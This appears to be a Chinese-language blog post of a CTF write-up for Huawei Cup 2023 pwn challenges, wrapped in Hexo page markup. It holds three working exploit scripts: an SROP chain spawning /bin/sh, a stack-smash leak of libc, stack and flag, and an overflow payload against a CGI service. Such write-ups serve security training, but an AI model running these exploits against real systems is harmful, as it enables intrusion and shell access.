@@ -1,0 +1,757 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/browser.jpg">
+  <link rel="icon" href="/img/browser.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="korey0sh1">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="又是代打的一天呢">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华为杯">
+<meta property="og:url" content="http://example.com/2023/09/28/%E5%8D%8E%E4%B8%BA%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="又是代打的一天呢">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023/index.jpg">
+<meta property="article:published_time" content="2023-09-28T06:03:57.000Z">
+<meta property="article:modified_time" content="2023-12-08T06:06:14.933Z">
+<meta property="article:author" content="korey0sh1">
+<meta property="article:tag" content="CTF、Pwn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023/index.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>华为杯 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>korey0sh1</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/%E5%8D%8E%E4%B8%BA%E6%9D%AF2023/banner.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="华为杯"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        korey0sh1
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-09-28 14:03" pubdate>
+          2023年9月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">华为杯</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年12月8日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>别问，问就是👴忘记找研院的联系老师审核了，报名没报上，捏麻麻滴。一想到进决赛就能回浙江耍，我身上仿佛有蚂蚁在爬</p>
+<p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p>
+<h1 id="0x1-pwn题解"><a href="#0x1-pwn题解" class="headerlink" title="0x1:pwn题解"></a>0x1:pwn题解</h1><h2 id="master-of-asm"><a href="#master-of-asm" class="headerlink" title="master of asm"></a>master of asm</h2><p>什么👴敢叫自己master of asm啊，知不知道自己有几斤小马珍珠啊</p>
+<p>就简单的srop</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">from pwn import *<br>import sys<br><span class="hljs-built_in">context</span>.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-built_in">context</span>.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>flag = <span class="hljs-number">0</span><br>if flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-symbol">else:</span><br>    p = process(<span class="hljs-string">&quot;./a.out&quot;</span>)<br>sa = lambda s,n : p.sendafter(s,n)<br>sla = lambda s,n : p.sendlineafter(s,n)<br>sl = lambda s : p.sendline(s)<br>sd = lambda s : p.send(s)<br>rc = lambda n : p.recv(n)<br>ru = lambda s : p.recvuntil(s)<br>ti = lambda : p.interactive()<br>leak = lambda name,<span class="hljs-keyword">addr </span>:log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(<span class="hljs-keyword">addr))</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">xor_0 </span>= <span class="hljs-number">0x40103d</span><br>rax_2 = <span class="hljs-number">0x401030</span><br><span class="hljs-keyword">xor_1 </span>= <span class="hljs-number">0x401034</span><br><span class="hljs-keyword">syscall </span>= <span class="hljs-number">0x40102d</span><br><span class="hljs-keyword">bin_sh </span>= <span class="hljs-number">0x40200a</span><br><br>exec_fun = SigreturnFrame()<br>exec_fun.rax = <span class="hljs-number">0x3b</span><br>exec_fun.rdi = <span class="hljs-keyword">bin_sh</span><br><span class="hljs-keyword"></span>exec_fun.rsi = <span class="hljs-number">0</span><br>exec_fun.rdx = <span class="hljs-number">0</span><br>exec_fun.rip = <span class="hljs-keyword">syscall</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">shellcode </span>= p64(<span class="hljs-keyword">xor_0)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(rax_2)\<br>            + p64(<span class="hljs-keyword">xor_1)\</span><br><span class="hljs-keyword"></span>            + p64(<span class="hljs-keyword">syscall)\</span><br><span class="hljs-keyword"></span>            + <span class="hljs-keyword">bytes(exec_fun)</span><br><span class="hljs-keyword"></span><br>p.send(<span class="hljs-keyword">shellcode.ljust(0x190,b&#x27;\x00&#x27;))</span><br><span class="hljs-keyword"></span>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ez-ssp"><a href="#ez-ssp" class="headerlink" title="ez_ssp"></a>ez_ssp</h2><p>👴当初铸币了，👴知道是stack smash，但👴不知道为什么一直在想一次溢出就把flag泄露出来，爆破栈地址爆了好久都没成功。</p>
+<p>然后结果只要轻轻泄露got表地址，再用libc把_environ里的栈地址拿出来就好了，草</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim">from pwn import *<br>import sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    <span class="hljs-keyword">p</span> = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">p</span> = process(<span class="hljs-string">&quot;./ssp&quot;</span>)<br><span class="hljs-keyword">sa</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendafter(s,n)<br><span class="hljs-keyword">sla</span> = lambda s,n : <span class="hljs-keyword">p</span>.sendlineafter(s,n)<br><span class="hljs-keyword">sl</span> = lambda s : <span class="hljs-keyword">p</span>.sendline(s)<br>sd = lambda s : <span class="hljs-keyword">p</span>.send(s)<br>rc = lambda n : <span class="hljs-keyword">p</span>.recv(n)<br><span class="hljs-keyword">ru</span> = lambda s : <span class="hljs-keyword">p</span>.recvuntil(s)<br>ti = lambda : <span class="hljs-keyword">p</span>.interactive()<br>leak = lambda name,addr :<span class="hljs-built_in">log</span>.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+hex(addr))<br># gdb.attach(<span class="hljs-keyword">p</span>,<span class="hljs-string">&#x27;b __stack_chk_fail\nc\n&#x27;</span>)<br><br>randon = []<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(<span class="hljs-number">0</span>x602018))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>libc.address = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(libc.sym[<span class="hljs-string">&#x27;_environ&#x27;</span>]))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;***: &#x27;</span>)<br>stack = u64(<span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack&quot;</span>,stack)<br><br>flag_addr = stack - <span class="hljs-number">0</span>x178<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>randon.<span class="hljs-keyword">append</span>(<span class="hljs-keyword">int</span>(rc(<span class="hljs-number">2</span>),<span class="hljs-number">10</span>))<br><span class="hljs-keyword">sla</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;?\n&#x27;</span>,<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0</span>x128 + p64(flag_addr))<br><span class="hljs-keyword">ru</span>(<span class="hljs-keyword">b</span><span class="hljs-string">&#x27;: &#x27;</span>)<br>flag = rc(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">print</span>(randon)<br>flag_list = <span class="hljs-keyword">list</span>(flag)  # 将字符串转换为列表，以便进行修改<br><span class="hljs-keyword">print</span>(flag_list)<br><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(randon)):<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">j</span> in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>        flag_list[<span class="hljs-keyword">j</span>] = flag_list[<span class="hljs-keyword">j</span>] ^ randon[<span class="hljs-number">2</span>-i]<br><br>flag_txt = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(flag_list)):<br>    flag_txt = flag_txt + chr(flag_list[i])<br><span class="hljs-keyword">print</span>(flag_txt)<br><span class="hljs-keyword">p</span>.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="APACHE-CGI-PWN"><a href="#APACHE-CGI-PWN" class="headerlink" title="APACHE-CGI-PWN"></a>APACHE-CGI-PWN</h2><p>👴一直以为这是个很吊的web pwn，然后浩哥哥直接秒了，👴才发现是个小瘪三</p>
+<p>话说最近怎么这么喜欢出套着web皮的 cgi pwn题吗，陇剑也是</p>
+<p>这边直接偷浩哥哥的exp了，嘻嘻</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>import requests<br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&quot;ROOT-GOD=Every king&#x27;s blood will end with a sword&quot;</span>,<br>    <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>:<span class="hljs-string">&#x27;99999&#x27;</span><br>&#125;<br><br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&#x27;a&#x27;</span>*(0xe8)+p64(0x4032fc)+p64(0x4032E0)<br>cookie = requests.post(<span class="hljs-string">&#x27;http://ip:port/getcookie.cgi&#x27;</span>,<span class="hljs-attribute">data</span>=<span class="hljs-string">&quot;eeknight&quot;</span>,headers=headers)<br>check = requests.post(<span class="hljs-string">&#x27;http://ip:port/check-ok.cgi&#x27;</span>, data = payload,<span class="hljs-attribute">headers</span>=headers)<br><br>p = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;http://ip:port/flag&#x27;</span>)<br><span class="hljs-built_in">print</span>(cookie.text)<br><span class="hljs-built_in">print</span>(check.text)<br><span class="hljs-built_in">print</span>(p.text)<br></code></pre></td></tr></table></figure>
+
+<h1 id="0x3-最后的最后"><a href="#0x3-最后的最后" class="headerlink" title="0x3:最后的最后"></a>0x3:最后的最后</h1><p>有什么好说的呢，就这样吧</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CtfMatch/" class="category-chain-item">CtfMatch</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF%E3%80%81Pwn/" class="print-no-link">#CTF、Pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>华为杯</div>
+      <div>http://example.com/2023/09/28/华为杯/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>korey0sh1</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年9月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/10/20/C/" title="dig into C++ pwn">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">dig into C++ pwn</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP证123456号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备12345678号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
